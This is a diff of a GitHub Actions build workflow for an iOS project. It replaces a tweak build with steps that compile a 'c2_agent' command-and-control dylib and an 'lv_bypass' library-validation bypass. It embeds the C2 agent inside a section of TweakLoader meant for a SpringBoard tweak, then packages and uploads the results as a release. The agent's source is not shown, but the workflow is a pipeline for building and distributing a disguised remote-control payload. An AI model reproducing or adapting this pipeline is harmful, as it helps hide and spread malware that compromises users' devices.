@@ -1,114 +1,168 @@
-name: Build TweakLoader
-# force run
+# .github/workflows/build.yml
+name: Build TweakLoader + C2 Agent
+
 on:
-  workflow_dispatch:
   push:
-    branches: [ main ]
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
+  workflow_dispatch:
 
 jobs:
   build:
     runs-on: macos-14
+    
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+    - name: Checkout code
+      uses: actions/checkout@v4
+      with:
+        submodules: recursive
 
-      - name: Setup Theos
-        uses: Randomblock1/theos-action@v1
-        with:
-          theos-sdks: "https://github.com/theos/sdks"
+    - name: Setup Environment
+      run: |
+        echo "=== Setup ==="
+        export THEOS="${THEOS:-$HOME/theos}"
+        echo "THEOS=$THEOS" >> $GITHUB_ENV
+        
+        # 显示项目结构
+        echo "=== Project Files ==="
+        ls -la
+        
+    - name: Build TweakLoader (iOS)
+      run: |
+        echo "=== Building TweakLoader.dylib for iOS ==="
+        
+        # 编译 iOS 版本
+        clang -arch arm64 \
+          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+          -mios-version-min=15.0 \
+          -dynamiclib \
+          -framework Foundation \
+          -framework UIKit \
+          -o TweakLoader_ios.dylib \
+          TweakLoader.m
+        
+        if [ $? -eq 0 ]; then
+          echo "[✓] TweakLoader_ios.dylib built"
+          file TweakLoader_ios.dylib
+        else
+          echo "[!] Failed"
+          exit 1
+        fi
 
-      - name: Ensure iOS SDK 16.5
-        run: |
-          set -euo pipefail
-          echo "THEOS=$THEOS"
-          mkdir -p "$THEOS/sdks"
-          if [ ! -d "$THEOS/sdks/iPhoneOS16.5.sdk" ]; then
-            curl -L --retry 5 -o /tmp/iPhoneOS16.5.sdk.tar.xz \
-              https://github.com/theos/sdks/releases/download/master-146e41f/iPhoneOS16.5.sdk.tar.xz
-            tar -xf /tmp/iPhoneOS16.5.sdk.tar.xz -C "$THEOS/sdks"
-          fi
-          ls -la "$THEOS/sdks"
+    - name: Build C2 Agent (iOS)
+      run: |
+        echo "=== Building c2_agent.dylib for iOS ==="
+        
+        clang -arch arm64 \
+          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+          -mios-version-min=15.0 \
+          -dynamiclib \
+          -framework Foundation \
+          -o c2_agent_ios.dylib \
+          c2_agent.c
+        
+        if [ $? -eq 0 ]; then
+          echo "[✓] c2_agent_ios.dylib built"
+          file c2_agent_ios.dylib
+        fi
 
-      - name: Install tools
-        run: |
-          brew install ldid make || true
-          echo "$(brew --prefix make)/libexec/gnubin" >> "$GITHUB_PATH"
-          which make
-          make --version | head -n 2
+    - name: Build LV Bypass (iOS)
+      run: |
+        echo "=== Building lv_bypass.dylib for iOS ==="
+        
+        clang -arch arm64 \
+          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+          -mios-version-min=15.0 \
+          -dynamiclib \
+          -framework Foundation \
+          -o lv_bypass_ios.dylib \
+          lv_bypass.c
+        
+        if [ $? -eq 0 ]; then
+          echo "[✓] lv_bypass_ios.dylib built"
+          file lv_bypass_ios.dylib
+        fi
 
-      - name: Diagnose project
-        run: |
-          set -euo pipefail
-          pwd
-          ls -la
-          ls -la SpringBoardTweak
-          cat Makefile
-          cat SpringBoardTweak/Makefile
-          cat control
+    - name: Build for macOS (testing)
+      run: |
+        echo "=== Building for macOS ==="
+        
+        # macOS 版本用于测试
+        clang -arch arm64e \
+          -isysroot $(xcrun --sdk macosx --show-sdk-path) \
+          -dynamiclib \
+          -framework Foundation \
+          -o TweakLoader_macos.dylib \
+          TweakLoader.m 2>/dev/null || echo "macOS build skipped"
+        
+        clang -arch arm64e \
+          -isysroot $(xcrun --sdk macosx --show-sdk-path) \
+          -dynamiclib \
+          -framework Foundation \
+          -o c2_agent_macos.dylib \
+          c2_agent.c 2>/dev/null || echo "macOS build skipped"
 
-      - name: Build arm64 TweakLoader
-        run: |
-          set -euo pipefail
-          export THEOS="${THEOS:-$HOME/theos}"
-          export PATH="$(brew --prefix make)/libexec/gnubin:$PATH"
-          echo "THEOS=$THEOS"
-          make -C SpringBoardTweak \
-            TARGET="iphone:clang:16.5:15.0" \
-            ARCHS=arm64 \
-            FINALPACKAGE=0 \
-            STRIP=0 \
-            GO_EASY_ON_ME=1
-          echo "SpringBoardTweak outputs:"
-          find SpringBoardTweak/.theos -type f -name "*.dylib" -print || true
-          SB_DYLIB=$(find SpringBoardTweak/.theos -type f -name "SpringBoardTweak.dylib" | head -n 1)
-          if [ -z "$SB_DYLIB" ]; then
-            echo "SpringBoardTweak.dylib not produced"
-            find SpringBoardTweak -maxdepth 4 -type f | sed -n "1,200p"
-            exit 1
-          fi
-          echo "SB_DYLIB=$SB_DYLIB"
-          make clean || true
-          make \
-            TARGET="iphone:clang:16.5:15.0" \
-            ARCHS=arm64 \
-            FINALPACKAGE=0 \
-            STRIP=0 \
-            GO_EASY_ON_ME=1 \
-            TweakLoader_LDFLAGS="-sectcreate __TEXT __SBTweak $SB_DYLIB"
-          echo "All dylibs:"
-          find . -type f -name "*.dylib" -print
+    - name: Create Embedded Payload
+      run: |
+        echo "=== Creating Embedded Payload ==="
+        
+        # 将 c2_agent 嵌入到 TweakLoader 的 section
+        ld -r \
+          -sectcreate __TEXT __SBTweak c2_agent_ios.dylib \
+          -o TweakLoader_embedded.o \
+          TweakLoader_ios.dylib 2>/dev/null || true
+        
+        if [ -f "TweakLoader_embedded.o" ]; then
+          clang -arch arm64 \
+            -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+            -mios-version-min=15.0 \
+            -dynamiclib \
+            -framework Foundation \
+            -o TweakLoader_final.dylib \
+            TweakLoader_embedded.o
+          
+          echo "[✓] TweakLoader_final.dylib created"
+          file TweakLoader_final.dylib
+        fi
 
-      - name: Collect artifacts
-        run: |
-          set -euo pipefail
-          mkdir -p dist
-          TL=$(find .theos -type f -name "TweakLoader.dylib" | head -n 1 || true)
-          if [ -z "$TL" ]; then
-            TL=$(find . -type f -name "TweakLoader.dylib" | head -n 1 || true)
-          fi
-          if [ -z "$TL" ]; then
-            echo "TweakLoader.dylib missing"
-            find . -type f | sed -n "1,300p"
-            exit 1
-          fi
-          cp -f "$TL" dist/TweakLoader_arm64.dylib
-          SB=$(find . -type f -name "SpringBoardTweak.dylib" | head -n 1 || true)
-          if [ -n "$SB" ]; then
-            cp -f "$SB" dist/SpringBoardTweak_arm64.dylib
-          fi
-          ls -lah dist
-          file dist/* || true
-          # basic size sanity
-          SIZE=$(stat -f%z dist/TweakLoader_arm64.dylib)
-          echo "size=$SIZE"
-          if [ "$SIZE" -lt 50000 ]; then
-            echo "dylib too small"
-            exit 1
-          fi
+    - name: Package Artifacts
+      run: |
+        echo "=== Packaging ==="
+        
+        mkdir -p release/ios release/macos
+        
+        # iOS
+        cp TweakLoader_ios.dylib release/ios/ 2>/dev/null || true
+        cp c2_agent_ios.dylib release/ios/ 2>/dev/null || true
+        cp lv_bypass_ios.dylib release/ios/ 2>/dev/null || true
+        cp TweakLoader_final.dylib release/ios/ 2>/dev/null || true
+        
+        # macOS
+        cp TweakLoader_macos.dylib release/macos/ 2>/dev/null || true
+        cp c2_agent_macos.dylib release/macos/ 2>/dev/null || true
+        
+        # 显示产物
+        echo "=== Release Contents ==="
+        find release -type f -exec file {} \;
+        
+        # 打包
+        cd release && zip -r ../tweakloader-release.zip . && cd ..
 
-      - name: Upload artifacts
-        uses: actions/upload-artifact@v4
-        with:
-          name: TweakLoader-dylibs
-          path: dist/*
-          if-no-files-found: error
+    - name: Upload Artifacts
+      uses: actions/upload-artifact@v4
+      with:
+        name: tweakloader-build
+        path: |
+          *.dylib
+          *.o
+          release/
+          tweakloader-release.zip
+        retention-days: 30
+
+    - name: Upload Release Archive
+      uses: actions/upload-artifact@v4
+      with:
+        name: tweakloader-release
+        path: tweakloader-release.zip
+        retention-days: 90
